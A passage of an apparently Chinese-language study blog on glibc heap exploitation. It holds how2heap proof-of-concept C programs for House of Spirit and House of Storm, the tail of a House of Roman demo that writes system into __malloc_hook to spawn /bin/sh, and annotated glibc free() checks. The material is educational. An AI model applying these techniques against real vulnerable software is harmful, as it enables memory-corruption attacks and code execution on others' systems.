	<span class="token comment">// Trigger the malloc call for code execution via the system call being ran from the __malloc_hook.</span>
	<span class="token comment">// In a real example, you would probably want to use a one_gadget. </span>
	<span class="token comment">// But, to keep things portable, we will just use system and add a pointer to /bin/sh as the parameter</span>
	<span class="token comment">// Although this is kind of cheating (the binary is PIE), if the binary was not PIE having a pointer into the .bss section would work without a single leak. </span>
	<span class="token comment">// To get the system address (eariler on for consistency), the binary must be PIE though. So, the address is put in here.</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Pop Shell!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span>shell<span class="token punctuation">)</span><span class="token punctuation">;</span>
		
<span class="token punctuation">&#125;</span></code></pre>

<p>创建4个chunk：</p>
<p>fastbin_victim,chunk_01,main_arena_use,relative_offset_heap</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220620143836361.png"></p>
<p>释放main_arena_use</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220620144111389.png"></p>
<p>申请fake_libc_chunk：</p>
<p>该chunk将从main_arena_heap中切割出来</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220620152439747.png"></p>
<p>获取__malloc_hook:</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220620153404551.png"></p>
<p>释放fastbin_victim，relative_offset_heap：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220620153702198.png"></p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220620154306773.png"></p>
<p>修改fd指针：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220620154820115.png"></p>
<p>修改fake_libc_chunk的fd指针：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220620164535591.png"></p>
<p>申请两个0x60的chunk：</p>
<p>未申请前bin：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220620164717291.png"></p>
<p>申请后：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220620164754847.png"></p>
<p>申请出malloc_hook_chunk,在申请ubsorted_bin_ptr，准备unsorted bin attack&#x3D;&#x3D;》</p>
<p>申请0x30的chunk防止合并</p>
<p>释放unsorted_bin_ptr：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220620201439154.png"></p>
<p>最后就是将system()写入__malloc_hook中</p>
<p>然后调用malloc(‘&#x2F;bin&#x2F;sh’)&#x3D;&#x3D;&gt;system(‘&#x2F;bin&#x2F;sh’)</p>
<p><strong>重点：</strong></p>
<p>在使用__malloc_hook-0x23时的低地址为xaed,x为0~f&#x3D;&#x3D;》此处需要爆破</p>
<p>并且运用此处是由于此处刚刚好有一个0x7f符合fastbin</p>
<h3 id="house-of-spirit-c"><a href="#house-of-spirit-c" class="headerlink" title="house_of_spirit.c"></a>house_of_spirit.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This file demonstrates the house of spirit attack.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Calling malloc() once so that it sets up its memory.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"We will now overwrite a pointer to point to a fake 'fastbin' region.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>a<span class="token punctuation">;</span>
	<span class="token comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> fake_chunks<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">aligned</span> <span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_chunks<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x40</span><span class="token punctuation">;</span> <span class="token comment">// this is the size</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) &amp;&amp; &lt; av->system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span>
	fake_chunks<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x1234</span><span class="token punctuation">;</span> <span class="token comment">// nextsize</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	a <span class="token operator">=</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Freeing the overwritten pointer.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"malloc(0x30): %p\n"</span><span class="token punctuation">,</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>申请一个chunk，创建fake_chunks</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220620204658753.png"></p>
<p>修改fake_chunks的1和9</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220620204800530.png"></p>
<p>a指向fake_chunks的data区，释放伪造的chunk a</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220620205022045.png"></p>
<p>chunk a被成功当作合法的chunk释放</p>
<p><strong>重点：</strong></p>
<p>_int_free函数对fastbin的检查：</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">//size的大小是否过大</span>
<span class="token comment">//chunk是否对齐，x64的chunk头为0x8对齐==》最低4bit只能为0或8</span>
size <span class="token operator">=</span> <span class="token function">chunksize</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uintptr_t</span><span class="token punctuation">)</span> p <span class="token operator">></span> <span class="token punctuation">(</span><span class="token class-name">uintptr_t</span><span class="token punctuation">)</span> <span class="token operator">-</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
      <span class="token operator">||</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">misaligned_chunk</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      errstr <span class="token operator">=</span> <span class="token string">"free(): invalid pointer"</span><span class="token punctuation">;</span>
    errout<span class="token operator">:</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>have_lock <span class="token operator">&amp;&amp;</span> locked<span class="token punctuation">)</span>
        <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token function">mutex_unlock</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>av<span class="token operator">-></span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> errstr<span class="token punctuation">,</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> av<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>


<span class="token comment">//检查size是否过小以及对齐，不能小于0x20且在x64中0x8对齐</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>size <span class="token operator">&lt;</span> MINSIZE <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">aligned_OK</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      errstr <span class="token operator">=</span> <span class="token string">"free(): invalid size"</span><span class="token punctuation">;</span>
      <span class="token keyword">goto</span> errout<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>


<span class="token comment">//检查下一个chunk的大小，不能小于0x10，不能大于av->system_mem</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">chunk_at_offset</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token operator">-></span>size <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">*</span> SIZE_SZ<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
	<span class="token operator">||</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">chunksize</span> <span class="token punctuation">(</span><span class="token function">chunk_at_offset</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">)</span>
			     <span class="token operator">>=</span> av<span class="token operator">-></span>system_mem<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
	<span class="token comment">/* We might not have a lock at this point and concurrent modifications
	   of system_mem might have let to a false positive.  Redo the test
	   after getting the lock.  */</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>have_lock
	    <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token function">assert</span> <span class="token punctuation">(</span>locked <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		  <span class="token function">mutex_lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>av<span class="token operator">-></span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>
		  locked <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
		  <span class="token function">chunk_at_offset</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token operator">-></span>size <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">*</span> SIZE_SZ
		    <span class="token operator">||</span> <span class="token function">chunksize</span> <span class="token punctuation">(</span><span class="token function">chunk_at_offset</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>=</span> av<span class="token operator">-></span>system_mem<span class="token punctuation">;</span>
	      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	  <span class="token punctuation">&#123;</span>
	    errstr <span class="token operator">=</span> <span class="token string">"free(): invalid next size (fast)"</span><span class="token punctuation">;</span>
	    <span class="token keyword">goto</span> errout<span class="token punctuation">;</span>
	  <span class="token punctuation">&#125;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> have_lock<span class="token punctuation">)</span>
	  <span class="token punctuation">&#123;</span>
	    <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token function">mutex_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>av<span class="token operator">-></span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>
	    locked <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	  <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>

<span class="token comment">//检查fastbin的前一个chunk是否是当前释放的chunk，防止double free</span>
fb <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token function">fastbin</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> idx<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* Atomically link P to its fastbin: P->FD = *FB; *FB = P;  */</span>
    mchunkptr old <span class="token operator">=</span> <span class="token operator">*</span>fb<span class="token punctuation">,</span> old2<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> old_idx <span class="token operator">=</span> <span class="token operator">~</span><span class="token number">0u</span><span class="token punctuation">;</span>
    <span class="token keyword">do</span>
      <span class="token punctuation">&#123;</span>
	<span class="token comment">/* Check that the top of the bin is not the record we are going to add
	   (i.e., double free).  */</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>old <span class="token operator">==</span> p<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	  <span class="token punctuation">&#123;</span>
	    errstr <span class="token operator">=</span> <span class="token string">"double free or corruption (fasttop)"</span><span class="token punctuation">;</span>
	    <span class="token keyword">goto</span> errout<span class="token punctuation">;</span>
	  <span class="token punctuation">&#125;</span>
	<span class="token comment">/* Check that size of fastbin chunk at the top is the same as
	   size of the chunk that we are adding.  We can dereference OLD
	   only if we have the lock, otherwise it might have already been
	   deallocated.  See use of OLD_IDX below for the actual check.  */</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>have_lock <span class="token operator">&amp;&amp;</span> old <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
	  old_idx <span class="token operator">=</span> <span class="token function">fastbin_index</span><span class="token punctuation">(</span><span class="token function">chunksize</span><span class="token punctuation">(</span>old<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	p<span class="token operator">-></span>fd <span class="token operator">=</span> old2 <span class="token operator">=</span> old<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>old <span class="token operator">=</span> <span class="token function">catomic_compare_and_exchange_val_rel</span> <span class="token punctuation">(</span>fb<span class="token punctuation">,</span> p<span class="token punctuation">,</span> old2<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> old2<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>





<h3 id="house-of-storm-c"><a href="#house-of-storm-c" class="headerlink" title="house_of_storm.c"></a>house_of_storm.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>

<span class="token keyword">char</span> filler<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">char</span> target<span class="token punctuation">[</span><span class="token number">0x60</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 

<span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// clearenv();</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// Get the AMOUNT to shift over for size and the offset on the largebin.</span>
<span class="token comment">// Needs to be a valid minimum sized chunk in order to work.</span>
<span class="token keyword">int</span> <span class="token function">get_shift_amount</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> pointer<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>

        <span class="token keyword">int</span> shift_amount <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">long</span> <span class="token keyword">long</span> ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span>pointer<span class="token punctuation">;</span>

        <span class="token keyword">while</span><span class="token punctuation">(</span>ptr <span class="token operator">></span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                ptr <span class="token operator">=</span> ptr <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">;</span>
                shift_amount <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">return</span> shift_amount <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// Want amount PRIOR to this being zeroed out</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>

	<span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">char</span> <span class="token operator">*</span>unsorted_bin<span class="token punctuation">,</span> <span class="token operator">*</span>large_bin<span class="token punctuation">,</span> <span class="token operator">*</span>fake_chunk<span class="token punctuation">,</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span>

	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"House of Storm"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"======================================"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Preparing chunks for the exploit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Put one chunk into unsorted bin and the other into the large bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"The unsorted bin chunk MUST be larger than the large bin chunk."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">/*
	Putting a chunk into the unsorted bin and another
	into the large bin.
	*/</span>
	unsorted_bin <span class="token operator">=</span> <span class="token function">malloc</span> <span class="token punctuation">(</span> <span class="token number">0x4e8</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// size 0x4f0 </span>

	<span class="token comment">// prevent merging </span>
	<span class="token function">malloc</span> <span class="token punctuation">(</span> <span class="token number">0x18</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> 

	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Find the proper chunk size to allocate."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Must be exactly the size of the written chunk from above."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">/* 
	Find the proper size to allocate
	We are using the first 'X' bytes of the heap to act 
	as the 'size' of a chunk. Then, we need to allocate a 
	chunk exactly this size for the attack to work. 

	So, in order to do this, we have to take the higher
	bits of the heap address and allocate a chunk of this
	size, which comes from the upper bytes of the heap address.

	NOTE: 
	- This does have a 1/2 chance of failing. If the 4th bit 
	of this value is set, then the size comparison will fail.
	- Without this calculation, this COULD be brute forced.
	*/</span>
	<span class="token keyword">int</span> shift_amount <span class="token operator">=</span> <span class="token function">get_shift_amount</span><span class="token punctuation">(</span>unsorted_bin<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Shift Amount: %d\n"</span><span class="token punctuation">,</span> shift_amount<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">size_t</span> alloc_size <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>unsorted_bin<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> shift_amount<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>alloc_size <span class="token operator">&lt;</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk Size: 0x%lx\n"</span><span class="token punctuation">,</span> alloc_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Chunk size is too small"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        alloc_size <span class="token operator">=</span> <span class="token punctuation">(</span>alloc_size <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFFE</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">;</span> <span class="token comment">// Remove the size bits</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"In this case, the chunk size is 0x%lx\n"</span><span class="token punctuation">,</span> alloc_size<span class="token punctuation">)</span><span class="token punctuation">;</span>


	<span class="token comment">// Checks to see if the program will crash or not</span>
        <span class="token comment">/*
        The fourth bit of the size and the 'non-main arena' chunk can NOT be set. Otherwise, the chunk. So, we MUST check for this first. 

        Additionally, the code at https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3438
        validates to see if ONE of the following cases is true: 
        - av == arena_for_chunk (mem2chunk (mem))
        - chunk is mmaped

        If the 'non-main arena' bit is set on the chunk, then the 
        first case will fail. 
        If the mmap bit is set, then this will pass. 
        
        So, either the arenas need to match up (our fake chunk is in the 
        .bss section for this demo. So, clearly, this will not happen) OR
        the mmap bit must be set.

        The logic below validates that the fourth bit of the size
        is NOT set and that either the mmap bit is set or the non-main 
        arena bit is NOT set. If this is the case, the exploit should work.
        */</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>alloc_size <span class="token operator">&amp;</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>alloc_size <span class="token operator">&amp;</span> <span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>alloc_size <span class="token operator">&amp;</span> <span class="token number">0x2</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0x2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Allocation size has bit 4 of the size set or "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"mmap and non-main arena bit check will fail"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Please try again! :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Exiting..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>

	<span class="token punctuation">&#125;</span>

	large_bin  <span class="token operator">=</span>  <span class="token function">malloc</span> <span class="token punctuation">(</span> <span class="token number">0x4d8</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// size 0x4e0 </span>
	<span class="token comment">// prevent merging </span>
	<span class="token function">malloc</span> <span class="token punctuation">(</span> <span class="token number">0x18</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// FIFO </span>
	<span class="token function">free</span> <span class="token punctuation">(</span> large_bin <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// put small chunks first </span>
	<span class="token function">free</span> <span class="token punctuation">(</span> unsorted_bin <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Put the 'large bin' chunk into the large bin</span>
	unsorted_bin <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x4e8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>unsorted_bin<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">/*
	At this point, there is a single chunk in the 
	large bin and a single chunk in the unsorted bin. 
	It should be noted that the unsorted bin chunk 
	should be LARGER in size than the large bin chunk
	but should still be within the same bin.

	In this setup, the large_bin has a chunk
	of size 0x4e0 and the unsorted bin 
	has a chunk of size 0x4f0. This technique relies on
	the unsorted bin chunk being added to the same bin
	but a larger chunk size. So, careful heap feng shui 
	must be done.
	*/</span>

	<span class="token comment">// The address that we want to write to!</span>
	fake_chunk <span class="token operator">=</span> target <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">;</span>

	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Vulnerability! Overwrite unsorted bins 'bk' pointer with our target location.\n This is our target location to get from the allocator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
	
